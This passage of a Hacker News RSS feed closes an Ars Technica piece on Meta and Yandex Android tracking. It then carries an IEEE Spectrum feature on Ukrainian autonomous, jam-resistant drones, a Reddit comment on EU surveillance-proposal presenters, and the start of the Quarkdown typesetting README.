<p>It's unclear whether browser-to-native-app tracking violates any privacy laws in various countries. Both Meta and companies hosting its Meta Pixel, however, <a href="https://arstechnica.com/tech-policy/2022/09/lawsuits-say-meta-evaded-apple-privacy-settings-to-spy-on-millions-of-users/">have</a> <a href="https://arstechnica.com/tech-policy/2022/11/major-tax-filing-websites-secretly-share-income-data-with-meta/">faced</a> a <a href="https://arstechnica.com/tech-policy/2023/07/meta-wont-say-what-happened-to-taxpayer-data-it-may-have-illegally-collected/">raft</a> of <a href="https://arstechnica.com/tech-policy/2024/02/amc-to-pay-8m-for-allegedly-violating-1988-law-with-use-of-meta-pixel/">lawsuits</a> in recent years alleging that the data collected violates privacy statutes. A <a href="https://arxiv.org/pdf/2208.00710">research paper</a> from 2023 found that Meta pixel, then called the Facebook Pixel, "tracks a wide range of user activities on websites with alarming detail, especially on websites classified as sensitive categories under GDPR," the abbreviation for the European Union's General Data Protection Regulation.</p>
<p>So far, Google has provided no indication that it plans to redesign the way Android handles local port access. For now, the most comprehensive protection against Meta Pixel and Yandex Metrica tracking is to refrain from installing the Facebook, Instagram, or Yandex apps on Android devices.</p>


          
                  </div>

                  
          






  <div>
  <div>
          <p><a href="https://arstechnica.com/author/dan-goodin/"><img src="https://cdn.arstechnica.net/wp-content/uploads/2018/10/Dang.jpg" alt="Photo of Dan Goodin"></a></p>
  </div>

  <div>
    

    <p>
      Dan Goodin is Senior Security Editor at Ars Technica, where he oversees coverage of malware, computer espionage, botnets, hardware hacking, encryption, and passwords. In his spare time, he enjoys gardening, cooking, and following the independent music scene. Dan is based in San Francisco. Follow him at <a href="https://infosec.exchange/@dangoodin" rel="me">here</a> on Mastodon and <a href="https://bsky.app/profile/dangoodin.bsky.social">here</a> on Bluesky. Contact him on Signal at DanArs.82.
    </p>
  </div>
</div>


  <p>
    <a href="https://arstechnica.com/security/2025/06/meta-and-yandex-are-de-anonymizing-android-users-web-browsing-identifiers/#comments" title="44 comments">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80"><defs><clipPath id="bubble-zero_svg__a"><path fill="none" stroke-width="0" d="M0 0h80v80H0z"></path></clipPath><clipPath id="bubble-zero_svg__b"><path fill="none" stroke-width="0" d="M0 0h80v80H0z"></path></clipPath></defs><g clip-path="url(#bubble-zero_svg__a)"><g fill="currentColor" clip-path="url(#bubble-zero_svg__b)"><path d="M80 40c0 22.09-17.91 40-40 40S0 62.09 0 40 17.91 0 40 0s40 17.91 40 40"></path><path d="M40 40 .59 76.58C-.67 77.84.22 80 2.01 80H40z"></path></g></g></svg>
    44 Comments
  </a>
      </p>
              </div>
  </article>


  


  


  <div>
    <header>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 26"><defs><clipPath id="most-read_svg__a"><path fill="none" d="M0 0h40v26H0z"></path></clipPath><clipPath id="most-read_svg__b"><path fill="none" d="M0 0h40v26H0z"></path></clipPath></defs><g clip-path="url(#most-read_svg__a)"><g fill="none" clip-path="url(#most-read_svg__b)"><path fill="currentColor" d="M20 2h.8q1.5 0 3 .6c.6.2 1.1.4 1.7.6 1.3.5 2.6 1.3 3.9 2.1.6.4 1.2.8 1.8 1.3 2.9 2.3 5.1 4.9 6.3 6.4-1.1 1.5-3.4 4-6.3 6.4-.6.5-1.2.9-1.8 1.3q-1.95 1.35-3.9 2.1c-.6.2-1.1.4-1.7.6q-1.5.45-3 .6h-1.6q-1.5 0-3-.6c-.6-.2-1.1-.4-1.7-.6-1.3-.5-2.6-1.3-3.9-2.1-.6-.4-1.2-.8-1.8-1.3-2.9-2.3-5.1-4.9-6.3-6.4 1.1-1.5 3.4-4 6.3-6.4.6-.5 1.2-.9 1.8-1.3q1.95-1.35 3.9-2.1c.6-.2 1.1-.4 1.7-.6q1.5-.45 3-.6zm0-2h-1c-1.2 0-2.3.3-3.4.6-.6.2-1.3.4-1.9.7-1.5.6-2.9 1.4-4.3 2.3-.7.5-1.3.9-1.9 1.4C2.9 8.7 0 13 0 13s2.9 4.3 7.5 7.9c.6.5 1.3 1 1.9 1.4 1.3.9 2.7 1.7 4.3 2.3.6.3 1.3.5 1.9.7 1.1.3 2.3.6 3.4.6h2c1.2 0 2.3-.3 3.4-.6.6-.2 1.3-.4 1.9-.7 1.5-.6 2.9-1.4 4.3-2.3.7-.5 1.3-.9 1.9-1.4C37.1 17.3 40 13 40 13s-2.9-4.3-7.5-7.9c-.6-.5-1.3-1-1.9-1.4-1.3-.9-2.8-1.7-4.3-2.3-.6-.3-1.3-.5-1.9-.7C23.3.4 22.1.1 21 .1h-1"></path><path fill="#ff4e00" d="M20 5c-4.4 0-8 3.6-8 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8m0 11c-1.7 0-3-1.3-3-3s1.3-3 3-3 3 1.3 3 3-1.3 3-3 3"></path></g></g></svg>
      
    </header>
    <ol>
              <li>
                      <a href="https://arstechnica.com/tech-policy/2025/06/isp-settles-with-record-labels-that-demanded-mass-termination-of-internet-users/">
              <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/08/getty-pirate-flag-768x432.jpg" alt="Listing image for first story in Most Read: ISP settles with record labels that demanded mass termination of Internet users" decoding="async" loading="lazy">
            </a>
                    
        </li>
                    <li>
                    
        </li>
                    <li>
                    
        </li>
                    <li>
                    
        </li>
                    <li>
                    
        </li>
                  </ol>
</div>


  

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ukraine's autonomous killer drones defeat electronic warfare (137 pts)]]></title>
            <link>https://spectrum.ieee.org/ukraine-killer-drones</link>
            <guid>44168658</guid>
            <pubDate>Tue, 03 Jun 2025 11:08:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/ukraine-killer-drones">https://spectrum.ieee.org/ukraine-killer-drones</a>, See on <a href="https://news.ycombinator.com/item?id=44168658">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>Ukrainian troops tested KrattWorks' Ghost Dragon drone in Estonia last year.</p><div data-headline="How Ukraine‚Äôs Killer Drones Are Beating Russian Jamming"><p><em><a href="https://www.axios.com/2025/06/01/ukraine-drone-strikes-russia" rel="noopener noreferrer" target="_blank">Ukraine‚Äôs 1 June attack</a> on multiple Russian military bases destroyed or damaged as many as 41 Russian aircraft, including some of the country‚Äôs most advanced bombers. Estimates of the sum total of the damage range from US $2 billion to $7 billion. Supposedly planned for a <a href="https://www.theguardian.com/world/2025/jun/02/operation-spiderweb-visual-guide-ukraine-drone-attack-russian-aircraft" rel="noopener noreferrer" target="_blank">year and a half</a>, the Ukrainian operation was exceptional in its sophistication: Ukrainian agents reportedly smuggled dozens of first-person-view attack <a href="https://spectrum.ieee.org/tag/drones">drones</a> into <a href="https://spectrum.ieee.org/tag/russia">Russia</a> on trucks, <a href="https://www.nytimes.com/2025/06/02/world/europe/ukraine-russia-drone-strikes.html" rel="noopener noreferrer" target="_blank">situating them close to the air bases</a> where the target aircraft were vulnerable on tarmacs. The bases included one in Irkutsk, 4,300 kilometers from <a href="https://spectrum.ieee.org/tag/ukraine">Ukraine</a>, and another in south Murmansk, 1,800 km away. Remote pilots in Ukraine then launched the killer drones simultaneously.
	</em></p><p><em>
	The far-reaching operation was being hailed as the most inventive and bold of the war so far. Indeed, </em>IEEE Spectrum<em> has been regularly covering the ascent of Ukraine‚Äôs military drone programs, both </em><em><a href="https://spectrum.ieee.org/ukraine-hackers-war" target="_self">offensive</a></em><em> and </em><em><a href="https://spectrum.ieee.org/ukraine-air-defense" target="_self">defensive</a></em><em>, and for </em><em><a href="https://spectrum.ieee.org/drone-warfare-ukraine">air</a></em><em>, </em><em><a href="https://spectrum.ieee.org/sea-drone" target="_self">marine</a></em><em>, and </em><em><a href="https://spectrum.ieee.org/ukraine-drones-2671254184" target="_self">land</a></em><em> missions. In this article, originally posted on April 6, we described another bold Ukrainian drone initiative, which was applying artificial intelligence-based navigational software to enable killer drones to navigate to targets even in the presence of heavy <a href="https://spectrum.ieee.org/tag/jamming">jamming</a>.</em></p><p><strong><span></span>After the Estonian startup </strong><a href="https://www.krattworks.com/" target="_blank">KrattWorks</a> dispatched the first batch of its <a href="https://www.krattworks.com/isr-ghostdragon" target="_blank">Ghost Dragon ISR</a>&nbsp;<a href="https://spectrum.ieee.org/tag/quadcopters">quadcopters</a> to Ukraine in mid-2022, the company‚Äôs officers thought they might have six months or so before they‚Äôd need to reconceive the drones in response to new battlefield realities. The 46-centimeter-wide flier was far more robust than the hobbyist-grade <a href="https://spectrum.ieee.org/tag/uavs">UAVs</a> that came to define the <a href="https://spectrum.ieee.org/ukraine-hackers-war" target="_self">early days of the drone war</a> against Russia. But within a scant three months, the Estonian team realized their painstakingly fine-tuned device had already become obsolete.
</p><p>
	Related: 
	<a href="https://spectrum.ieee.org/ukraine-drones-2671254184" target="_blank">Ukraine Tech Turns Combat into Real-Life ‚ÄúGame‚Äù</a></p><p>
	Rapid advances in 
	<a href="https://spectrum.ieee.org/tag/jamming" target="_self">jamming</a> and <a href="https://spectrum.ieee.org/tag/spoofing" target="_self">spoofing</a>‚Äîthe only efficient defense against drone attacks‚Äîset the team on an unceasing marathon of innovation. Its latest technology is a neural-network-driven optical navigation system, which allows the drone to continue its mission even when all radio and satellite-navigation links are jammed. It began tests in <a href="https://spectrum.ieee.org/tag/ukraine" target="_self">Ukraine</a> in December, part of a trend toward jam-resistant, <a href="https://spectrum.ieee.org/search/?q=autonomous+drones" target="_self">autonomous UAVs</a> (uncrewed aerial vehicles). The new fliers herald yet another phase in the unending struggle that pits drones against the jamming and <a href="https://spectrum.ieee.org/tag/spoofing">spoofing</a> of <a href="https://spectrum.ieee.org/the-fall-and-rise-of-russian-electronic-warfare" target="_self">electronic warfare,</a> which aims to sever links between drones and their operators. There are now <a href="https://www.nytimes.com/interactive/2025/03/03/world/europe/ukraine-russia-war-drones-deaths.html" rel="noopener noreferrer" target="_blank">tens of thousands</a> of jammers straddling the front lines of the war, defending against drones that are not just killing soldiers but also destroying armored vehicles, other drones, <a href="https://kyivindependent.com/russia-missile-attack/" rel="noopener noreferrer" target="_blank">industrial infrastructure</a>, and even tanks.
</p><p data-rm-resized-container="25%"><img alt="A man wearing a dark-green long-sleeve t-shirt, seen from behind, holds a drone with both hands above his head." data-rm-shortcode-id="670ed8b9ef5644576b6f8f9836a06576" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/a-man-wearing-a-dark-green-long-sleeve-t-shirt-seen-from-behind-holds-a-drone-with-both-hands-above-his-head.jpg?id=59800469&amp;width=980" height="3500" id="090b5" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/a-man-wearing-a-dark-green-long-sleeve-t-shirt-seen-from-behind-holds-a-drone-with-both-hands-above-his-head.jpg?id=59800469&amp;width=980" width="2800"><small placeholder="Add Photo Caption...">During tests near Kyiv, Ukraine, in 2024, a technician prepared to release a drone outfitted with software by Auterion.</small><small placeholder="Add Photo Credit...">
	Justyna Mielnikiewicz
	</small></p><p>
	‚ÄúThe situation with <a href="https://spectrum.ieee.org/tag/electronic-warfare">electronic warfare</a> is moving extremely fast,‚Äù says Martin Karmin, KrattWorks‚Äô cofounder and chief operations officer. ‚ÄúWe have to constantly iterate. It‚Äôs like a cat-and-mouse game.‚Äù
</p><p>
	I met Karmin at the company‚Äôs headquarters in the outskirts of Estonia‚Äôs capital, Tallinn. Just a couple of hundred kilometers to the east is the tiny nation‚Äôs border with Russia, its former oppressor. At 38, Karmin is barely old enough to remember what life was like under Russian rule, but he‚Äôs heard plenty. He and his colleagues, most of them volunteer members of the 
	<a href="https://www.kaitseliit.ee/en/edl" rel="noopener noreferrer" target="_blank">Estonian Defense League</a>, have ‚Äúno illusions‚Äù about <a href="https://spectrum.ieee.org/tag/russia" target="_self">Russia</a>, he says with a shrug.
</p><p>
	His company is as much about arming <a href="https://spectrum.ieee.org/tag/estonia">Estonia</a> as it is about helping Ukraine, he acknowledges. Estonia is not officially at war with Russia, of course, but regions around the border between the two countries have for years been subjected to persistent jamming of satellite-based <a href="https://spectrum.ieee.org/tag/navigation-systems">navigation systems</a>, such as the 
	<a href="https://defence-industry-space.ec.europa.eu/eu-space/galileo-satellite-navigation_en" rel="noopener noreferrer" target="_blank">European Union‚Äôs Galileo satellites</a>, forcing occasional flight cancellations at Tartu airport. In November, <a href="https://spectrum.ieee.org/tag/satellite" target="_self">satellite</a> imagery revealed that Russia is expanding its military bases along the Baltic states‚Äô borders.
</p><p>
	‚ÄúWe are a small country,‚Äù Karmin says. ‚ÄúInnovation is our only chance.‚Äù
</p><h2>Navigating by Neural Network</h2><p>
	In KrattWorks‚Äô spacious, white-walled workshop, a handful of engineers are testing software. On the large ocher desk that dominates the room, a selection of KrattWorks‚Äô devices is on display, including a couple of fixed-wing, smoke-colored UAVs designed to serve as aerial decoys, and the Ghost Dragon ISR 
	<a href="https://spectrum.ieee.org/tag/quadcopter" target="_self">quadcopter</a>, the company‚Äôs flagship product.
</p><p>
	Now in its third generation, the Ghost Dragon has come a long way since 2022. Its original command-and-control-band 
	<a href="https://spectrum.ieee.org/tag/radio" target="_self">radio</a> was quickly replaced with a smart frequency-hopping system that constantly scans the available spectrum, looking for bands that aren‚Äôt jammed. It allows operators to switch among six radio-frequency bands to maintain control and also send back video even in the face of hostile jamming.
</p><p><img alt="A black quadcopter drone hovers in front of a coniferous tree." data-rm-shortcode-id="a63ed6b62a8e73e583b5ce084557e634" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/a-black-quadcopter-drone-hovers-in-front-of-a-coniferous-tree.jpg?id=59800498&amp;width=980" height="794" id="ca339" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/a-black-quadcopter-drone-hovers-in-front-of-a-coniferous-tree.jpg?id=59800498&amp;width=980" width="1270"><small placeholder="Add Photo Caption...">The Ghost Dragon reconnaissance drone from Krattworks can navigate autonomously, by detecting landmarks as it flies over them. </small><small placeholder="Add Photo Credit...">KrattWorks</small></p><p>
	The drone‚Äôs dual-band satellite-navigation receiver can switch among the four main satellite positioning services: 
	<a href="https://family1st.io/gps-vs-glonass-vs-galileo-whats-the-best-gnss/" rel="noopener noreferrer" target="_blank">GPS, Galileo</a>, China‚Äôs BeiDou, and Russia‚Äôs <a href="https://spectrum.ieee.org/tag/glonass">GLONASS</a>. It‚Äôs been augmented with a spoof-proof algorithm that compares the satellite-navigation input with data from onboard sensors. The system provides protection against sophisticated spoofing attacks that attempt to trick drones into self-destruction by persuading them they‚Äôre flying at a much higher altitude than they actually are.
</p><p>
	At the heart of the quadcopter‚Äôs matte grey body is a machine-vision-enabled computer running a 1-gigahertz Arm processor that provides the Ghost Dragon with its latest superpower: the ability to navigate autonomously, without access to any global navigation satellite system (<a href="https://spectrum.ieee.org/tag/gnss">GNSS</a>). To do that, the computer runs a 
	<a href="https://spectrum.ieee.org/tag/neural-network" target="_self">neural network</a> that, like an old-fashioned traveler, compares views of landmarks with positions on a map to determine its position. More precisely, the drone uses real-time views from a downward-facing optical camera, comparing them against stored satellite images, to determine its position.
</p><p><span data-rm-shortcode-id="c7a71f63bfede8e7831651bd1a76a5e8"><iframe frameborder="0" height="auto" type="lazy-iframe" scrolling="no" data-runner-src="https://www.youtube.com/embed/tGCFBHbw6HQ?rel=0" width="100%"></iframe></span><small placeholder="Add Photo Caption...">A promotional video from Krattworks depicts scenarios in which the company‚Äôs drones augment soldiers on offensive maneuvers.</small><small placeholder="Add Photo Credit...">KrattWorks</small></p><p>
	‚ÄúEven if it gets lost, it can recognize some patterns, like crossroads, and update its position,‚Äù Karmin says. ‚ÄúIt can make its own decisions, somewhat, either to return home or to fly through the jamming bubble until it can reestablish the GNSS link again.‚Äù
</p><h2>Designing Drones for High Lethality per Cost</h2><p>
	Just as machine guns and tanks defined the First World War, drones have become emblematic of Ukraine‚Äôs struggle against Russia. It was the besieged Ukraine that first turned the concept of a military drone on its head. Instead of Predators and Reapers worth tens of millions of dollars each, Ukraine began purchasing huge numbers of off-the-shelf fliers worth a few hundred dollars apiece‚Äîthe kind used by filmmakers and enthusiasts‚Äîand turned them into highly lethal <a href="https://spectrum.ieee.org/tag/weapons">weapons</a>. A recent 
	<a href="https://www.nytimes.com/interactive/2025/03/03/world/europe/ukraine-russia-war-drones-deaths.html" rel="noopener noreferrer" target="_blank"><em><em>New York Times</em></em> investigation</a> found that drones account for 70 percent of deaths and injuries in the ongoing conflict.
</p><p>
	‚ÄúWe have much less artillery than Russia, so we had to compensate with drones,‚Äù says 
	<a href="https://www.linkedin.com/in/serhii-skoryk-20b02728b/?originalSubdomain=ua" rel="noopener noreferrer" target="_blank">Serhii Skoryk</a>, commercial director at <a href="https://kvertus.ua/" rel="noopener noreferrer" target="_blank">Kvertus</a>, a Kyiv-based electronic-warfare company. ‚ÄúA missile is worth perhaps a million dollars and can kill maybe 12 or 20 people. But for one million dollars, you can buy 10,000 drones, put four grenades on each, and they will kill 1,000 or even 2,000 people or destroy 200 tanks.‚Äù
</p><p><img alt="A man in camouflage uniform is surrounded by military gear, including drones. " data-rm-shortcode-id="c6a0b6470088c9d32d62087a112dae9a" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/a-man-in-camouflage-uniform-is-surrounded-by-military-gear-including-drones.jpg?id=59800500&amp;width=980" height="3853" id="a5d2c" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/a-man-in-camouflage-uniform-is-surrounded-by-military-gear-including-drones.jpg?id=59800500&amp;width=980" width="6165"><small placeholder="Add Photo Caption...">Near the Russian border in Kharkiv Oblast, a Ukrainian soldier prepared first-person-view drones for an attack on 16 January 2025.</small><small placeholder="Add Photo Credit...">Jose Colon/Anadolu/Getty Images</small></p><p>
	Electronic warfare techniques such as jamming and spoofing aim to neutralize the drone threat. A drone that gets jammed and loses contact with its pilot and also loses its spatial bearings will either crash or fly off randomly until its battery dies.
	<a href="https://static.rusi.org/403-SR-Russian-Tactics-web-final.pdf" rel="noopener noreferrer" target="_blank"> According to the Royal United Services Institute</a>, a U.K. defense think tank, Ukraine may be losing about 10,000 drones per month, mostly due to jamming. That number includes explosives-laden kamikaze drones that don‚Äôt reach their targets, as well as surveillance and reconnaissance drones like KrattWorks‚Äô Ghost Dragon, meant for longer service.
</p><p>
	‚ÄúDrones have become a consumable item,‚Äù says Karmin. ‚ÄúYou will get maybe 10 or 15 missions out of a reconnaissance drone, and then it has to be already paid off because you will lose it sooner or later.‚Äù
</p><p>
	 Russia took an unexpected step in the summer of 2024, ditching sophisticated wireless control in favor of hard-wired drones fitted with spools of <a href="https://spectrum.ieee.org/tag/optical-fiber">optical fiber.
</a></p><p>
	Tech minds on both sides of the conflict have therefore been working hard to circumvent electronic defenses. Russia took an unexpected step starting in early 2024, deploying hard-wired drones fitted with spools of optical fiber. Like a twisted variation on a child‚Äôs kite, the lethal UAVs can venture 20 or more kilometers away from the controller, the hair-thin fiber floating behind them, providing an unjammable connection.
</p><p>
	‚ÄúRight now, there is no protection against <a href="https://spectrum.ieee.org/tag/fiber-optic">fiber-optic</a> drones,‚Äù 
	<a href="https://www.linkedin.com/in/vadym-burukin-1378abbb/?originalSubdomain=ua" rel="noopener noreferrer" target="_blank">Vadym Burukin</a>, cofounder of the Ukrainian drone startup <a href="https://huless.com/" rel="noopener noreferrer" target="_blank">Huless</a>, tells <em><em>IEEE</em></em>&nbsp;<em><em>Spectrum</em></em>. ‚ÄúThe Russians scaled this solution pretty fast, and now they are saturating the battle front with these drones. It‚Äôs a huge problem for Ukraine.‚Äù
</p><p><img alt="A drone carrying a large cylindrical object flies over a blurry forest background." data-rm-shortcode-id="c5a9250fbac728b7b2a951af2e4492d2" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/a-drone-carrying-a-large-cylindrical-object-flies-over-a-blurry-forest-background.jpg?id=59800502&amp;width=980" height="2766" id="b73cf" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/a-drone-carrying-a-large-cylindrical-object-flies-over-a-blurry-forest-background.jpg?id=59800502&amp;width=980" width="4425"><small placeholder="Add Photo Caption...">One way that drone operators can defeat electronic jamming is by communicating with their drone via a fiber optic line that pays out of a spool as the drone flies. This is a tactic favored by Russian units, although this particular first-person-view drone is Ukrainian. It was demonstrated near Kyiv on 29 January 2025.</small><small placeholder="Add Photo Credit...">Efrem Lukatsky/AP</small></p><p>
	Ukraine, too, has experimented with optical fiber, but the technology didn‚Äôt take off, as it were. ‚ÄúThe optical fiber costs upwards from $500, which is, in many cases, more than the drone itself,‚Äù Burukin says. ‚ÄúIf you use it in a drone that carries <a href="https://spectrum.ieee.org/tag/explosives">explosives</a>, you lose some of that capacity because you have the weight of the cable.‚Äù The extra weight also means less capacity for better-quality cameras, sensors, and computers in reconnaissance drones.
</p><h2>Small Drones May Soon Be Making Kill-or-No-Kill Decisions</h2><p>
	Instead, Ukraine sees the future in autonomous navigation. This past July, kamikaze drones equipped with an autonomous navigation system from U.S. supplier
	<a href="https://auterion.com/" rel="noopener noreferrer" target="_blank"> Auterion</a> destroyed a column of Russian tanks fitted with jamming devices.
</p><p>
	‚ÄúIt was really hard to strike these tanks because they were jamming everything,‚Äù says Burukin. ‚ÄúThe drones with the <a href="https://spectrum.ieee.org/tag/autopilot">autopilot</a> were the only equipment that could stop them.‚Äù
</p><p><img alt="A diagram shows a quadcopter drone flying above a communications tower as it attempts to navigate to an enemy tank." data-rm-shortcode-id="4009b55dda0d71df9507b2de4cc944ef" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/a-diagram-shows-a-quadcopter-drone-flying-above-a-communications-tower-as-it-attempts-to-navigate-to-an-enemy-tank.jpg?id=59800510&amp;width=980" height="1165" id="3ddb9" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/a-diagram-shows-a-quadcopter-drone-flying-above-a-communications-tower-as-it-attempts-to-navigate-to-an-enemy-tank.jpg?id=59800510&amp;width=980" width="2739"><small placeholder="Add Photo Caption...">Auterion‚Äôs ‚Äúterminal guidance‚Äù system uses known landmarks to orient a drone as it seeks out a target. </small><small placeholder="Add Photo Credit...">Auterion</small></p><p>
	The technology used to hit those tanks is called terminal guidance and is the first step toward smart, fully autonomous drones, according to Auterion‚Äôs CEO, Lorenz Meier. The system allows the drone to directly overcome the jamming whether the protected target is a tank, a trench, or a military airfield.
</p><p>
	‚ÄúIf you lock on the target from, let‚Äôs say, a kilometer away and you get jammed as you approach the target, it doesn‚Äôt matter,‚Äù Meier says in an interview. ‚ÄúYou‚Äôre not losing the target as a manual operator would.‚Äù
</p><p>
	The visual navigation technology trialed by KrattWorks is the next step and an innovation that has only reached the battlefield this year. Meier expects that by the end of 2025, firms including his own will introduce fully autonomous solutions encompassing visual navigation to overcome <a href="https://spectrum.ieee.org/tag/gps-jamming">GPS jamming</a>, as well as terminal guidance and smart target recognition.
</p><p>
	‚ÄúThe operator would only decide the area where to strike, but the decision about the target is made by the drone,‚Äù Meier explains. ‚ÄúIt‚Äôs already done with guided shells, but with drones you can do that at mass scale and over much greater distances.‚Äù
</p><p>
	Auterion, founded in 2017 to produce drone software for civilian applications such as grocery delivery, threw itself into the war effort in early 2024, motivated by a desire to equip democratic countries with technologies to help them defend themselves against authoritarian regimes. Since then, the company has made rapid strides, working closely with Ukrainian drone makers and troops.
</p><p><span>‚ÄúA missile worth perhaps a million dollars can kill maybe 12 or 20 people. But for one million dollars, you can buy 10,000 drones, put four grenades on each, and they will kill 1,000 or even 2,000 people or destroy 200 tanks.‚Äù <strong>‚ÄîSerhii Skoryk, Kvertus</strong></span></p><p>
	But purchasing Western equipment is, in the long term, not affordable for Ukraine, a country with a per capita GDP of 
	<a href="https://www.imf.org/external/datamapper/profile/UKR" rel="noopener noreferrer" target="_blank">US $5,760</a>‚Äîmuch lower than the European average of <a href="https://www.imf.org/external/datamapper/profile/EUQ" rel="noopener noreferrer" target="_blank">$38,270</a>. Fortunately, Ukraine can tap its engineering workforce, which is among the largest in Europe. Before the war, Ukraine was a go-to place for Western companies looking to set up IT- and software-development centers. Many of these workers have since joined Ukraine‚Äôs DIY military-technician (‚Äúmiltech‚Äù) development movement.
</p><p>
	An engineer and founder at a Ukrainian startup that produces long-range kamikaze drones, who didn‚Äôt want to be named because of security concerns, told 
	<em><em>Spectrum</em></em> that the company began developing its own computers and autonomous navigation software for target tracking ‚Äújust to keep the price down.‚Äù The engineer said Ukrainian startups offer advanced military-drone technology at a price that is a small fraction of what established competitors in the West are charging.
</p><p>
	Within three years of the February 2022 Russian invasion, Ukraine produced a world-class defense-tech ecosystem that is not only attracting Western innovators into its fold, but also regularly surpassing them. The keys to Ukraine‚Äôs success are rapid iterations and close cooperation with frontline troops. It‚Äôs a formula that‚Äôs working for Auterion as well. ‚ÄúIf you want to build a leading product, you need to be where the product is needed the most,‚Äù says Meier. ‚ÄúThat‚Äôs why we‚Äôre in Ukraine.‚Äù
</p><p>
	Burukin, from Ukrainian startup Huless, believes that autonomy will play a bigger role in the future of drone warfare than 
	<a href="https://www.rferl.org/a/russia-fiber-optic-drones-ukraine-battlefield/33270243.html" rel="noopener noreferrer" target="_blank">Russia‚Äôs optical fibers</a> will. Autonomous drones not only evade jamming, but their range is limited only by their battery storage. They also can carry more explosives or better cameras and sensors than the wired drones can. On top of that, they don‚Äôt place high demands on their operators.
</p><p>
	‚ÄúIn the perfect world, the drone should take off, fly, find the target, strike it, and report back on the task,‚Äù Burukin says. ‚ÄúThat‚Äôs where the development is heading.‚Äù
</p><p>
	The cat-and-mouse game is nowhere near over. Companies including KrattWorks are already thinking about the next innovation that would make drone warfare cheaper and more lethal. By creating a drone <a href="https://spectrum.ieee.org/tag/mesh-network">mesh network</a>, for example, they could send a sophisticated intelligence, surveillance, and reconnaissance drone followed by a swarm of simpler kamikaze drones to find and attack a target using visual navigation.
</p><p>
	‚ÄúYou can send, like, 10 drones, but because they can fly themselves, you don‚Äôt need a superskilled operator controlling every single one of these,‚Äù notes KrattWorks‚Äô Karmin, who keeps tabs on tech developments in Ukraine with a mixture of professional interest, personal empathy, and foreboding. Rarely does a day go by that he does not think about the expanding Russian military presence near Estonia‚Äôs eastern borders.
</p><p>
	‚ÄúWe don‚Äôt have a lot of people in Estonia,‚Äù he says. ‚ÄúWe will never have enough skilled drone pilots. We must find another way.‚Äù 
	<span></span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[EU Commission refuses to disclose authors behind its mass surveillance proposal (390 pts)]]></title>
            <link>https://old.reddit.com/r/europe/comments/1l2655n/the_eu_commission_refuses_to_disclose_the/</link>
            <guid>44168134</guid>
            <pubDate>Tue, 03 Jun 2025 09:42:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://old.reddit.com/r/europe/comments/1l2655n/the_eu_commission_refuses_to_disclose_the/">https://old.reddit.com/r/europe/comments/1l2655n/the_eu_commission_refuses_to_disclose_the/</a>, See on <a href="https://news.ycombinator.com/item?id=44168134">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Even though the names re blacked out, you can see which organisations did presentations based on the agenda of the meetings. </p>

<p>For example there is a presentation by Timelex (a belgian law firm specialising in IT/privacy etc). There is a presentation by the EU Counter-Terrorism Coordinator (which in 2023 was Ilkka Salmi). Various presentations by EU orgs like ENISA, the commission, europol, Eurojust </p>

<p>Then a bunch of presentations by law enforcement agencies like Europol, French Gendarmerie, Belgian &amp; Swedish justice ministries. One presentation was by 3 Italians from ministry of interior, postal police and Anti Crime Unit (DAC). One presentation was from someone from Belgian Federal police. </p>

<p>There was also someone from KU Leuven university (likely from the COSIC research group on encryption). </p>

<p>Addtionally there are some specific titles of people who gave presentations : </p>

<p>Head of the National &amp; Tactical Support Unit, Belgian Police</p>

<p>Head of Unit, Law Enforcement Cooperation and Border Management, Department for European Home Affairs Cooperation, Ministry of the Interior, Hungary</p>

<p>Deputy Director General, Directorate-General for Migration and Home Affairs, European Commission</p>

<p>Justice and Home Affairs Counsellor, Permanent Representation of Belgium to the EU</p>

<p>Deputy Director General, Directorate-General for Migration and Home Affairs, European Commission</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Quarkdown: A modern Markdown-based typesetting system (361 pts)]]></title>
            <link>https://github.com/iamgio/quarkdown</link>
            <guid>44167592</guid>
            <pubDate>Tue, 03 Jun 2025 08:06:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/iamgio/quarkdown">https://github.com/iamgio/quarkdown</a>, See on <a href="https://news.ycombinator.com/item?id=44167592">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><hr>

<p dir="auto"><h2 tabindex="-1" dir="auto">Table of contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of contents" href="#table-of-contents"></a></p>
<ol dir="auto">
<li><a href="#about">About</a></li>
<li><a href="#as-simple-as-you-expect">Demo</a></li>
<li><a href="#targets">Targets</a></li>
<li><a href="#comparison">Comparison</a></li>
<li><a href="#getting-started">Getting started</a>
<ol dir="auto">
<li><a href="#installation">Installation</a></li>
<li><a href="#creating-a-project">Creating a project</a></li>
<li><a href="#compiling">Compiling</a></li>
</ol>
</li>
<li><a href="#mock-document">Mock document</a></li>
<li><a href="#contributing">Contributing</a></li>
<li><a href="#sponsors">Sponsors</a></li>
<li><a href="#concept">Concept</a></li>
</ol>

<p dir="auto"><h2 tabindex="-1" dir="auto">About</h2><a id="user-content-about" aria-label="Permalink: About" href="#about"></a></p>
<p dir="auto">Quarkdown is a modern Markdown-based typetting system, designed around the key concept of <strong>versatility</strong>, by seamlessly compiling a project
into a print-ready book or an interactive presentation.
All through an incredibly powerful Turing-complete extension of Markdown, ensuring your ideas flow automatically into paper.</p>

